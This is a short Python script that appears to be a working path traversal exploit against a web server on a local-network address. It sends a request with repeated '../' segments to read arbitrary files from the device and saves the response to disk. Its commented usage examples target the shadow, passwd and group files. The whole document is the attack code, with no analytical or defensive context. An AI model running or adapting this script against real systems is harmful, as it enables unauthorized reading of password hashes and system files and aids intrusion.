#python read_conf.py 

import requests
import sys


#try:
url = "http://{}:80/web-static/web-static/../../../../../../../../../../{}".format(sys.argv[1],sys.argv[2])
headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.105 Safari/537.36", "Accept": "*/*", "Referer": "http://192.168.2.229/", "Accept-Encoding": "gzip, deflate", "Accept-Language": "en-US,en;q=0.9", "Connection": "close"}
res = requests.get(url, headers=headers)
res.encoding = 'utf-8'

print(res)
print(res.text)
with open('test', 'wb') as file:
	file.write(res.content)
#except:
#	print("[+HELP EXAMPLE]  python read_conf.py 192.168.2.229 shadow")
#	print("[+HELP EXAMPLE]  python read_conf.py 192.168.2.229 passwd")
#	print("[+HELP EXAMPLE]  python read_conf.py 192.168.2.229 group")

#tmp/mnt/harddisk_1/test.txt